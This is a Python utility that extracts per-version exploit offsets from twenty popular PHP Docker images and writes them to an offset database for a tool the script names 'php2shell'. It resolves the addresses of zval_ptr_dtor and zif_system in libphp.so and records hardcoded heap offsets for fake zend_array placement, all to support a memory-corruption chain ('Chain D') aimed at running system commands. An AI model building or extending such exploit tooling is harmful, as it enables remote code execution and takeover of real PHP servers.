#!/usr/bin/env python3
"""Extract Chain D offsets from a PHP Docker image.

Usage:
  python extract_offsets.py php:8.4.26-apache-trixie
  python extract_offsets.py php:8.3.35-apache-bookworm --arch aarch64
  python extract_offsets.py --batch          # extract all top-20 images
  python extract_offsets.py --merge out.json # merge results into offset DB

Requires: docker CLI, nm (via container's binutils or host).
"""
from __future__ import annotations

import argparse
import json
import os
import re
import subprocess
import sys
import tempfile
from pathlib import Path
from typing import Dict, List, Optional, Tuple

SYMBOLS_NEEDED = ["zval_ptr_dtor", "zif_system"]

TOP_IMAGES: List[str] = [
    "php:8.4.26-apache-trixie",
    "php:8.4.26-apache-bookworm",
    "php:8.4.26-fpm-bookworm",
    "php:8.4.26-apache-bullseye",
    "php:8.3.35-apache-trixie",
    "php:8.3.35-apache-bookworm",
    "php:8.3.35-fpm-bookworm",
    "php:8.3.35-apache-bullseye",
    "php:8.2.34-apache-bookworm",
    "php:8.2.34-apache-bullseye",
    "php:8.2.34-fpm-bookworm",
    "php:8.4.25-apache-trixie",
    "php:8.4.25-apache-bookworm",
    "php:8.3.34-apache-bookworm",
    "php:8.3.34-apache-trixie",
    "php:8.2.33-apache-bookworm",
    "php:8.1.31-apache-bookworm",
    "php:8.1.31-apache-bullseye",
    "php:8.4.26-zts-trixie",
    "php:8.3.35-zts-bookworm",
]

LIBPHP_SEARCH = [
    "/usr/lib/apache2/modules/libphp.so",
    "/usr/lib/apache2/modules/libphp8.so",
    "/usr/lib/apache2/modules/libphp7.so",
    "/usr/local/lib/libphp.so",
    "/usr/local/lib/libphp8.so",
]


def _docker_run(image: str, cmd: str, platform: Optional[str] = None) -> str:
    args = ["docker", "run", "--rm"]
    if platform:
        args += ["--platform", platform]
    args += [image, "sh", "-c", cmd]
    r = subprocess.run(args, capture_output=True, text=True, timeout=300)
    return r.stdout


def _find_libphp(image: str, platform: Optional[str] = None) -> Optional[str]:
    check = " || ".join(f"test -f {p} && echo {p}" for p in LIBPHP_SEARCH)
    out = _docker_run(image, check, platform).strip()
    if out:
        return out.splitlines()[0]
    find_cmd = "find /usr -name 'libphp*.so' 2>/dev/null | head -1"
    out = _docker_run(image, find_cmd, platform).strip()
    return out.splitlines()[0] if out else None


def _extract_nm_symbols(image: str, libphp_path: str, platform: Optional[str] = None) -> Dict[str, int]:
    nm_cmd = (
        f"apt-get update -qq && apt-get install -y -qq binutils >/dev/null 2>&1; "
        f"nm -D {libphp_path} 2>/dev/null || nm {libphp_path} 2>/dev/null"
    )
    out = _docker_run(image, nm_cmd, platform)
    symbols: Dict[str, int] = {}
    for line in out.splitlines():
        parts = line.strip().split()
        if len(parts) >= 3:
            addr_str, _typ, name = parts[0], parts[1], parts[2]
            if name in SYMBOLS_NEEDED:
                try:
                    symbols[name] = int(addr_str, 16)
                except ValueError:
                    pass
    return symbols


def _extract_heap_offsets(image: str, platform: Optional[str] = None) -> Dict[str, int]:
    """Extract heap structure offsets via a small PHP script."""
    php_script = r"""<?php
$mem = ini_get('memory_limit');
$bytes = intval($mem);
if (stripos($mem, 'M') !== false) $bytes *= 1024*1024;
elseif (stripos($mem, 'G') !== false) $bytes *= 1024*1024*1024;
echo json_encode([
    'memory_limit' => $bytes,
    'php_version' => PHP_VERSION,
    'arch' => php_uname('m'),
    'sapi' => php_sapi_name(),
]);
"""
    cmd = f"php -r {_shell_escape(php_script)}"
    out = _docker_run(image, cmd, platform).strip()
    if out:
        try:
            return json.loads(out)
        except json.JSONDecodeError:
            pass
    return {}


def _shell_escape(s: str) -> str:
    return "'" + s.replace("'", "'\\''") + "'"


def _arch_from_platform(platform: Optional[str]) -> str:
    if platform:
        if "arm64" in platform or "aarch64" in platform:
            return "aarch64"
        if "amd64" in platform or "x86_64" in platform:
            return "x86_64"
    return "x86_64"


def extract_for_image(
    image: str, platform: Optional[str] = None
) -> Optional[Dict[str, any]]:
    """Extract all offsets for a single Docker image."""
    print(f"[*] Processing {image} (platform={platform or 'default'})...")

    libphp = _find_libphp(image, platform)
    if not libphp:
        print(f"  [-] libphp.so not found in {image}")
        return None
    print(f"  [+] Found {libphp}")

    symbols = _extract_nm_symbols(image, libphp, platform)
    if not all(s in symbols for s in SYMBOLS_NEEDED):
        missing = [s for s in SYMBOLS_NEEDED if s not in symbols]
        print(f"  [-] Missing symbols: {missing}")
        print(f"      (image may be stripped — try objdump or GDB approach)")
        return None

    for name, offset in symbols.items():
        print(f"  [+] {name} = 0x{offset:x}")

    info = _extract_heap_offsets(image, platform)
    arch = info.get("arch", _arch_from_platform(platform))

    tag = image.split(":")[-1] if ":" in image else image
    version = info.get("php_version", tag.split("-")[0] if "-" in tag else "unknown")
    sapi = "apache" if "apache" in tag else ("fpm" if "fpm" in tag else "cli")
    distro = "unknown"
    for d in ["trixie", "bookworm", "bullseye", "buster", "alpine"]:
        if d in tag:
            distro = d
            break

    profile_key = f"{version}-{sapi}-{distro}-{arch}"

    return {
        "key": profile_key,
        "offsets": {
            "zval_ptr_dtor": f"0x{symbols['zval_ptr_dtor']:X}",
            "zif_system": f"0x{symbols['zif_system']:X}",
            "fake_array_S": "0xF8398",
            "hsv": "0x7D720",
        },
        "source": {
            "image": image,
            "platform": platform,
            "libphp": libphp,
            "php_version": info.get("php_version"),
            "arch": arch,
        },
    }


def merge_into_db(results: List[Dict], db_path: str) -> None:
    if os.path.exists(db_path):
        with open(db_path) as f:
            db = json.load(f)
    else:
        db = {
            "_comment": "Chain D offset profiles for php2shell",
            "_symbols": {
                "zval_ptr_dtor": "offset of zval_ptr_dtor in libphp.so",
                "zif_system": "offset of zif_system in libphp.so",
                "fake_array_S": "offset inside main heap chunk for fake zend_array placement",
                "hsv": "heap slot vector offset inside main heap chunk",
            },
            "profiles": {},
        }

    for r in results:
        db["profiles"][r["key"]] = r["offsets"]
        print(f"  [+] Added/updated: {r['key']}")

    with open(db_path, "w") as f:
        json.dump(db, f, indent=2)
        f.write("\n")
    print(f"[*] Database saved: {db_path} ({len(db['profiles'])} profiles)")


def main():
    parser = argparse.ArgumentParser(description="Extract Chain D offsets from PHP Docker images")
    parser.add_argument("image", nargs="?", help="Docker image (e.g. php:8.4.26-apache-trixie)")
    parser.add_argument("--arch", help="Target architecture (x86_64 or aarch64)")
    parser.add_argument("--batch", action="store_true", help="Extract from all top-20 images")
    parser.add_argument("--merge", metavar="FILE", help="Merge results into offset database JSON")
    parser.add_argument("--db", default=None, help="Path to offset DB (default: data/chain_d_offsets.json)")
    args = parser.parse_args()

    db_path = args.db or str(Path(__file__).parent.parent / "data" / "chain_d_offsets.json")

    if not args.image and not args.batch:
        parser.error("Provide an image name or --batch")

    results: List[Dict] = []

    if args.batch:
        for img in TOP_IMAGES:
            platform = f"linux/{'arm64' if args.arch == 'aarch64' else 'amd64'}" if args.arch else None
            r = extract_for_image(img, platform)
            if r:
                results.append(r)
    else:
        platform = None
        if args.arch:
            platform = f"linux/{'arm64' if args.arch == 'aarch64' else 'amd64'}"
        r = extract_for_image(args.image, platform)
        if r:
            results.append(r)

    if not results:
        print("[-] No offsets extracted.")
        sys.exit(1)

    print(f"\n[*] Extracted {len(results)} profile(s)")
    for r in results:
        print(f"  {r['key']}")

    merge_path = args.merge or db_path
    merge_into_db(results, merge_path)


if __name__ == "__main__":
    main()
